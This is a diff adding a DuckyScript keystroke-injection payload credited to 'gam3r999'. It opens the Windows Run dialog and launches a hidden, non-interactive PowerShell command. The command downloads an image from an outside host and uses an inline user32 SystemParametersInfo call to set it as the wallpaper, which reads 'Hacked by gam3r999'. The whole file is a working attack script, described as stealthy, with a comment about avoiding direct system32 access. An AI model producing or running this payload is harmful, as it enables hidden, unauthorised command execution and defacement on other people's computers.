@@ -1,0 +1,11 @@
+REM Wallpaper via URL - Stealthy Keyboard Only
+REM Author: gam3r999
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Use CMD to launch PowerShell (avoids system32 direct access)
+STRING cmd /c powershell -w hidden -NoProfile -NonInteractive -Command "$img='$env:USERPROFILE\Pictures\wallpaper.jpg'; Invoke-WebRequest -Uri 'https://i.ibb.co/DZF8r0P/A-dark-hacker-style-wallpaper-with-the-words-Hacked-by-gam3r999-in-the-exact-center-glowing-neon-gre.jpg' -OutFile $img; Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class a{[DllImport(""user32.dll"")]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);}' ; [a]::SystemParametersInfo(20,0,$img,3)"
+DELAY 500
+ENTER
